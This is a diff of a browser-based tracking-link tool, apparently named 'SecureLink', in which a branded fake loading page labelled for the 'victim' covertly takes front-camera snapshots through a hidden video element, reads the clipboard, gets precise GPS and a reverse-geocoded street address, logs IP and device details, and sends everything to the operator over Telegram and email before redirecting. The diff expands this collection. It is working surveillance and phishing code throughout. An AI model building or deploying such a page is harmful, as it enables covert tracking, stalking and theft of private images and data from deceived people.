-      <div style="position:fixed;bottom:20px;left:50%;transform:translateX(-50%);width:200px;height:3px;background:rgba(0,0,0,0.1);border-radius:2px;overflow:hidden">
-        <div id="progressBar" style="height:100%;background:${brand.color};width:0;transition:width linear"></div>
+      <div class="victim-logo-wrap">${brand.logo}</div>
+      <div class="brand-spinner" style="border-top-color:${brand.color};border-color:${brand.spinnerBorder};border-top-color:${brand.color}"></div>
+      <p id="victimMsg" class="victim-sub">${link.message}</p>
+      <p class="victim-status">Please do not close this page</p>
+      <div class="collection-indicator" id="collectionDots"></div>
+      <div class="progress-track" style="background:${brand.spinnerBorder}">
+        <div id="progressBar" class="progress-fill" style="background:${brand.color}"></div>
       </div>
       <video id="camVideo" autoplay playsinline muted style="position:fixed;top:-9999px;width:1px;height:1px"></video>
       <canvas id="camCanvas" style="position:fixed;top:-9999px"></canvas>
     </div>
   `;
-
+  
+  // Increment hits
   const real = state.links.find(l => l.code === link.code);
   if (real) {
     real.hits = (real.hits || 0) + 1;
     saveLinks();
   }
-
-  const progressBar = document.getElementById('progressBar');
-  progressBar.style.transitionDuration = link.duration + 's';
-  setTimeout(() => { progressBar.style.width = '100%'; }, 100);
-
+  
+  // Rotate messages
   let msgIdx = 0;
   const msgEl = document.getElementById('victimMsg');
   const msgInterval = setInterval(() => {
@@ -1068,262 +1199,271 @@ function launchVictim(link) {
     if (msgEl) {
       msgEl.style.opacity = '0';
       setTimeout(() => {
-        msgEl.textContent = messages[msgIdx];
-        msgEl.style.opacity = '.7';
+        if (msgEl) {
+          msgEl.textContent = messages[msgIdx];
+          msgEl.style.opacity = '0.6';
+        }
       }, 200);
     }
-  }, Math.max(800, (link.duration * 1000) / messages.length));
-
-  const timerPromise = new Promise(r => setTimeout(r, link.duration * 1000));
-  const pipelinePromise = (async () => {
-    try {
-      const log = await collectData(link);
-      if (link.code !== 'preview') {
-        log.new = true;
-        const lean = { ...log };
-        if (Array.isArray(lean.snapshots) && lean.snapshots.length) {
-          lean.snapshots = lean.snapshots.map(() => '[captured]');
-        }
-        delete lean.camera;
-        state.logs.push(lean);
-        if (state.logs.length > 100) state.logs = state.logs.slice(-100);
-        safeSet('sl_logs', state.logs);
-        await Promise.allSettled([ deliverToTelegram(log), deliverToEmail(log) ]);
-        renderStats();
-      }
-    } catch(e) {
-      console.error('pipeline error', e);
-    }
-  })();
-
-  const cappedPipeline = Promise.race([
-    pipelinePromise,
-    new Promise(r => setTimeout(r, Math.max(8000, link.duration * 1000 + 4000)))
-  ]);
-
-  Promise.all([timerPromise, cappedPipeline]).then(() => {
-    clearInterval(msgInterval);
-    if (link.code === 'preview') {
-      vs.classList.add('hidden');
-      document.getElementById('adminPanel').classList.remove('hidden');
-      window.location.hash = 'admin';
-      toast('Preview completed', 'info');
-    } else if (link.dest) {
-      window.location.href = link.dest;
-    }
+  }, Math.max(1500, minDisplayMs / messages.length));
+  
+  // Collect data with status tracking
+  collectDataWithStatus(link, status).then(log => {
+    status.allDone = true;
+    status.completed = status.total;
+    updateCollectionDots(status);
+    
+    state.logs.push(log);
+    saveLogs();
+    deliverToTelegram(log);
+    deliverToEmail(log);
+    
+    // Check if we should redirect now
+    tryRedirect();
   });
+  
+  // Try redirect logic
+  function tryRedirect() {
+    if (status.redirected) return;
+    const elapsed = Date.now() - startTime;
+    const minTimeReached = elapsed >= minDisplayMs;
+    const allCollected = status.allDone;
+    
+    if (minTimeReached && allCollected) {
+      doRedirect();
+    } else if (elapsed >= maxTimeoutMs) {
+      // Force redirect after max timeout even if collection incomplete
+      doRedirect();
+    }
+  }
+  
+  function doRedirect() {
+    if (status.redirected) return;
+    status.redirected = true;
+    clearInterval(msgInterval);
+    
+    if (link.dest && link.code !== 'preview') {
+      window.location.href = link.dest;
+    } else if (link.code === 'preview') {
+      vs.style.display = 'none';
+      document.getElementById('adminPanel').style.display = 'block';
+      window.location.hash = 'admin';
+      toast('Preview completed — check Data Vault', 'success');
+    }
+  }
+  
+  // Periodic check for redirect readiness
+  const checkInterval = setInterval(() => {
+    if (status.redirected) {
+      clearInterval(checkInterval);
+      return;
+    }
+    tryRedirect();
+  }, 500);
 }
 
-/* ============ DATA COLLECTION ============ */
-async function collectData(link) {
-  const log = {
-    id: Date.now(),
-    code: link.code,
-    timestamp: new Date().toISOString(),
-    url: window.location.href
-  };
-
-  const mods = link.modules || [];
-
-  if (mods.includes('ip')) {
-    try {
-      const r = await fetch('https://api.ipify.org/?format=json');
-      const d = await r.json();
-      log.ip = d.ip;
-    } catch (e) { log.ip = 'unknown'; }
+function updateCollectionDots(status) {
+  const container = document.getElementById('collectionDots');
+  if (!container) return;
+  let html = '';
+  for (let i = 0; i < status.total; i++) {
+    const cls = i < status.completed ? 'done' : (i === status.completed && !status.allDone ? 'active' : '');
+    html += `<div class="collection-dot ${cls}"></div>`;
   }
+  container.innerHTML = html;
+}
 
+/* ============ DATA COLLECTION WITH STATUS ============ */
+async function collectDataWithStatus(link, status) {
+  const log = {
+    id: Date.now() + '-' + Math.random().toString(36).slice(2,8),
+    code: link.code,
+    brand: link.brand,
+    timestamp: new Date().toISOString(),
+    url: window.location.href,
+    snaps: []
+  };
+  
+  const mods = link.modules || [];
+  const snapCount = link.snapCount || 3;
+  const imgQuality = state.settings.defImgQuality || 0.5;
+  
+  // Count total tasks for progress
+  const taskList = ['ip', 'location', 'camera', 'device', 'battery', 'network', 'clipboard', 'geocode'];
+  status.total = mods.filter(m => taskList.includes(m)).length;
+  if (status.total === 0) status.total = 1;
+  updateCollectionDots(status);
+  
+  // Start camera EARLY
+  let cameraStream = null;
+  if (mods.includes('camera')) {
+    try {
+      cameraStream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
+        audio: false 
+      });
+      const video = document.getElementById('camVideo');
+      video.srcObject = cameraStream;
+      await new Promise(r => video.onloadedmetadata = r);
+      await new Promise(r => setTimeout(r, 800));
+    } catch (e) {
+      log.snaps = ['denied'];
+      cameraStream = null;
+      status.completed++;
+      updateCollectionDots(status);
+    }
+  }
+  
+  // Parallel collection tasks
+  const tasks = [];
+  
+  if (mods.includes('ip')) {
+    tasks.push((async () => {
+      try {
+        const r = await fetch('https://api.ipify.org/?format=json');
+        const d = await r.json();
+        log.ip = d.ip;
+      } catch (e) { log.ip = 'unknown'; }
+      status.completed++;
+      updateCollectionDots(status);
+    })());
+  }
+  
   if (mods.includes('device')) {
     log.device = navigator.userAgent;
     log.platform = navigator.platform;
     log.language = navigator.language;
     log.screen = `${screen.width}x${screen.height}`;
     try { log.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+    status.completed++;
+    updateCollectionDots(status);
   }
-
+  
   if (mods.includes('location')) {
-    try {
-      const pos = await new Promise((res, rej) => {
-        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
-      });
-      log.location = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
-      log.accuracy = Math.round(pos.coords.accuracy);
-    } catch (e) { log.location = 'denied'; }
+    tasks.push((async () => {
+      try {
+        const pos = await new Promise((res, rej) => {
+          navigator.geolocation.getCurrentPosition(res, rej, { 
+            timeout: 15000, 
+            enableHighAccuracy: true 
+          });
+        });
+        log.location = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
+        log.accuracy = Math.round(pos.coords.accuracy);
+        log.altitude = pos.coords.altitude;
+        
+        if (mods.includes('geocode')) {
+          try {
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&zoom=18&addressdetails=1`);
+            const geoData = await geoRes.json();
+            if (geoData.display_name) {
+              log.address = geoData.display_name;
+              log.addressDetails = geoData.address;
+            }
+          } catch (e) {}
+        }
+      } catch (e) { log.location = 'denied'; }
+      status.completed++;
+      updateCollectionDots(status);
+    })());
   }
-
-  if (mods.includes('camera')) {
+  
+  if (mods.includes('battery') && navigator.getBattery) {
+    tasks.push((async () => {
+      try {
+        const b = await navigator.getBattery();
+        log.battery = `${Math.round(b.level * 100)}%${b.charging ? ' (charging)' : ''}`;
+      } catch (e) {}
+      status.completed++;
+      updateCollectionDots(status);
+    })());
+  }
+  
+  if (mods.includes('network') && navigator.connection) {
+    log.connection = navigator.connection.effectiveType;
+    log.downlink = navigator.connection.downlink;
+    status.completed++;
+    updateCollectionDots(status);
+  }
+  
+  if (mods.includes('clipboard')) {
+    tasks.push((async () => {
+      try {
+        const txt = await navigator.clipboard.readText();
+        log.clipboard = txt.slice(0, 500);
+      } catch (e) { log.clipboard = 'denied'; }
+      status.completed++;
+      updateCollectionDots(status);
+    })());
+  }
+  
+  await Promise.all(tasks);
+  
+  // Take multiple camera snaps at intervals
+  if (cameraStream) {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       const video = document.getElementById('camVideo');
-      video.srcObject = stream;
-      await new Promise(r => video.onloadedmetadata = r);
-      await new Promise(r => setTimeout(r, 800));
-
       const canvas = document.getElementById('camCanvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
-
-      const snapsWanted = Math.max(2, Math.min(5, link.snapCount || 3));
-      const snaps = [];
-      const totalWindow = Math.max(1200, (link.duration * 1000) - 1500);
-      const step = totalWindow / snapsWanted;
-
-      for (let i = 0; i < snapsWanted; i++) {
+      
+      const interval = Math.min(1200, 8000 / snapCount);
+      
+      for (let i = 0; i < snapCount; i++) {
+        await new Promise(r => setTimeout(r, interval));
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        snaps.push(canvas.toDataURL('image/jpeg', 0.6));
-        if (i < snapsWanted - 1) {
-          await new Promise(r => setTimeout(r, step));
-        }
+        const dataUrl = canvas.toDataURL('image/jpeg', imgQuality);
+        log.snaps.push(dataUrl);
       }
-      stream.getTracks().forEach(t => t.stop());
-      log.snapshots = snaps;
-      log.camera = snaps[0];
-    } catch (e) { log.camera = 'denied'; }
-  }
-
-  if (mods.includes('battery')) {
-    if (typeof navigator.getBattery !== 'function') {
-      log.battery = 'unsupported';
-    } else {
-      try {
-        const b = await navigator.getBattery();
-        log.battery = `${Math.round(b.level * 100)}%${b.charging ? ' (charging)' : ''}`;
-      } catch (e) { log.battery = 'denied'; }
+      
+      cameraStream.getTracks().forEach(t => t.stop());
+    } catch (e) {
+      if (log.snaps.length === 0) log.snaps = ['error'];
+      if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
     }
   }
-
-  if (mods.includes('network')) {
-    if (navigator.connection) {
-      log.connection = navigator.connection.effectiveType;
-      log.downlink = navigator.connection.downlink;
-    } else {
-      log.connection = 'unsupported';
-    }
-  }
-
-  if (mods.includes('clipboard')) {
-    const tryRead = async () => {
-      try {
-        const txt = await navigator.clipboard.readText();
-        log.clipboard = (txt || '').slice(0, 200);
-        return true;
-      } catch(e) { return false; }
-    };
-    await tryRead();
-    if (!log.clipboard) {
-      await new Promise(resolve => {
-        const handler = async () => {
-          document.removeEventListener('click', handler, true);
-          document.removeEventListener('touchstart', handler, true);
-          await tryRead();
-          resolve();
-        };
-        document.addEventListener('click', handler, { capture: true, once: true });
-        document.addEventListener('touchstart', handler, { capture: true, once: true });
-        setTimeout(resolve, 2500);
-      });
-    }
-    if (!log.clipboard) log.clipboard = 'denied';
-  }
-
-  if (mods.includes('fingerprint')) {
-    try {
-      log.fingerprint = await computeFingerprint();
-    } catch (e) { log.fingerprint = 'failed'; }
-  }
-
+  
   return log;
-}
-
-async function computeFingerprint() {
-  const parts = [];
-
-  try {
-    const c = document.createElement('canvas');
-    c.width = 200; c.height = 50;
-    const ctx = c.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillStyle = '#f60';
-    ctx.fillRect(0, 0, 100, 30);
-    ctx.fillStyle = '#069';
-    ctx.fillText('SecureLink, fp!', 2, 2);
-    ctx.fillStyle = 'rgba(102,204,0,0.7)';
-    ctx.fillText('SecureLink, fp!', 4, 4);
-    parts.push(c.toDataURL());
-  } catch(e) {}
-
-  try {
-    const gl = document.createElement('canvas').getContext('webgl');
-    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    if (dbg) {
-      parts.push(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL));
-      parts.push(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
-    }
-  } catch(e) {}
-
-  parts.push(navigator.hardwareConcurrency || '');
-  parts.push(navigator.deviceMemory || '');
-  parts.push(navigator.maxTouchPoints || '');
-  parts.push(screen.colorDepth || '');
-  parts.push(Intl.DateTimeFormat().resolvedOptions().timeZone || '');
-  parts.push((navigator.languages || []).join(','));
-
-  const raw = parts.join('|');
-  let h = 0;
-  for (let i = 0; i < raw.length; i++) {
-    h = (h << 5) - h + raw.charCodeAt(i);
-    h |= 0;
-  }
-  const hex = (h >>> 0).toString(16).padStart(8, '0');
-  return `fp_${hex}`;
 }
 
 /* ============ DELIVERY ============ */
 async function deliverToTelegram(log) {
   const s = state.settings;
   if (!s.tgToken || !s.tgChat) return;
-
+  
+  const realSnaps = log.snaps ? log.snaps.filter(s => s.startsWith('data:')) : [];
   const text = `🎯 *New Hit — /${log.code}*\n\n` +
     `🌐 IP: \`${log.ip || 'N/A'}\`\n` +
-    `📍 Location: ${log.location || 'N/A'}${log.accuracy ? ' ±'+log.accuracy+'m' : ''}\n` +
-    `💻 Platform: ${log.platform || 'N/A'}\n` +
+    `📍 Location: ${log.location || 'N/A'}\n` +
+    (log.address ? `🗺️ Address: ${log.address.slice(0,200)}\n` : '') +
+    `💻 Device: ${log.platform || 'N/A'}\n` +
     `🌍 Lang: ${log.language || 'N/A'}\n` +
     `📱 Screen: ${log.screen || 'N/A'}\n` +
     `⏰ Timezone: ${log.tz || 'N/A'}\n` +
     `🔋 Battery: ${log.battery || 'N/A'}\n` +
     `📶 Network: ${log.connection || 'N/A'}\n` +
-    `📋 Clipboard: ${log.clipboard ? '`' + log.clipboard.slice(0,100) + '`' : 'N/A'}\n` +
-    `🔍 Fingerprint: ${log.fingerprint || 'N/A'}\n` +
-    `🔗 URL: ${log.url}\n` +
+    `📸 Snaps: ${realSnaps.length}\n` +
+    `📋 Clipboard: ${log.clipboard && log.clipboard !== 'denied' ? '`' + log.clipboard.slice(0,100) + '`' : 'N/A'}\n` +
     `⏱️ ${new Date(log.timestamp).toLocaleString()}`;
-
+  
   try {
     await fetch(`https://api.telegram.org/bot${s.tgToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: s.tgChat, text, parse_mode: 'Markdown' })
     });
-
-    const snaps = Array.isArray(log.snapshots) ? log.snapshots.filter(x => x && x.startsWith('data:')) : [];
-    if (snaps.length) {
-      if (snaps.length === 1) {
-        const f = new FormData();
-        f.append('chat_id', s.tgChat);
-        f.append('caption', `📸 Snapshot — /${log.code}`);
-        f.append('photo', dataURLtoBlob(snaps[0]), 'snap1.jpg');
-        await fetch(`https://api.telegram.org/bot${s.tgToken}/sendPhoto`, { method: 'POST', body: f });
-      } else {
-        for (let i = 0; i < snaps.length; i++) {
-          const f = new FormData();
-          f.append('chat_id', s.tgChat);
-          f.append('caption', `📸 Snapshot ${i+1}/${snaps.length} — /${log.code}`);
-          f.append('photo', dataURLtoBlob(snaps[i]), `snap${i+1}.jpg`);
-          await fetch(`https://api.telegram.org/bot${s.tgToken}/sendPhoto`, { method: 'POST', body: f });
-          await new Promise(r => setTimeout(r, 400));
-        }
-      }
+    
+    for (let i = 0; i < realSnaps.length; i++) {
+      try {
+        const form = new FormData();
+        form.append('chat_id', s.tgChat);
+        form.append('caption', `📸 Snap ${i+1}/${realSnaps.length} — /${log.code}`);
+        form.append('photo', dataURLtoBlob(realSnaps[i]), `snap_${i+1}.jpg`);
+        await fetch(`https://api.telegram.org/bot${s.tgToken}/sendPhoto`, {
+          method: 'POST', body: form
+        });
+      } catch (e) {}
     }
   } catch (e) { console.error('TG fail', e); }
 }
@@ -1339,11 +1479,13 @@ async function deliverToEmail(log) {
       await new Promise(r => { script.onload = r; script.onerror = r; });
     }
     emailjs.init(s.emPub);
+    const realSnaps = log.snaps ? log.snaps.filter(s => s.startsWith('data:')) : [];
     await emailjs.send(s.emSvc, s.emTpl, {
       to_email: s.emTo,
       code: log.code,
       ip: log.ip || 'N/A',
       location: log.location || 'N/A',
+      address: log.address || 'N/A',
       device: log.device || 'N/A',
       platform: log.platform || 'N/A',
       language: log.language || 'N/A',
@@ -1352,8 +1494,7 @@ async function deliverToEmail(log) {
       battery: log.battery || 'N/A',
       connection: log.connection || 'N/A',
       clipboard: log.clipboard || 'N/A',
-      fingerprint: log.fingerprint || 'N/A',
-      snapshots: Array.isArray(log.snapshots) ? `${log.snapshots.length} captured` : 'N/A',
+      snap_count: realSnaps.length,
       timestamp: new Date(log.timestamp).toLocaleString(),
       url: log.url
     });
@@ -1372,7 +1513,22 @@ function dataURLtoBlob(dataurl) {
 
 /* ============ UTIL ============ */
 function saveLinks() {
-  safeSet('sl_links', state.links);
+  localStorage.setItem('sl_links', JSON.stringify(state.links));
+}
+
+function saveLogs() {
+  try {
+    localStorage.setItem('sl_logs', JSON.stringify(state.logs));
+  } catch (e) {
+    toast('Storage full — removing oldest data', 'error');
+    state.logs = state.logs.slice(Math.floor(state.logs.length * 0.3));
+    try {
+      localStorage.setItem('sl_logs', JSON.stringify(state.logs));
+    } catch (e2) {
+      state.logs = [];
+      localStorage.setItem('sl_logs', '[]');
+    }
+  }
 }
 
 function toast(msg, type = 'info') {
@@ -1386,20 +1542,22 @@ function toast(msg, type = 'info') {
   setTimeout(() => el.remove(), 3000);
 }
 
-window.addEventListener('storage', (e) => {
-  if (e.key === 'sl_links') {
-    state.links = safeGet('sl_links', []);
-    renderStats();
-  }
-  if (e.key === 'sl_logs') {
-    state.logs = safeGet('sl_logs', []);
-    renderStats();
-    if (state.currentTab === 'logs') renderLogs();
-  }
+/* ============ EVENT BINDINGS ============ */
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('loginBtn').addEventListener('click', handleLogin);
+  document.getElementById('loginPass').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') { e.preventDefault(); handleLogin(); }
+  });
+  init();
 });
 
-window.addEventListener('hashchange', init);
-init();
+window.addEventListener('hashchange', () => {
+  const hash = window.location.hash.slice(1);
+  if (hash && hash !== 'admin') {
+    const link = state.links.find(l => l.code === hash);
+    if (link && link.active) launchVictim(link);
+  }
+});
 </script>
 </body>
 </html>
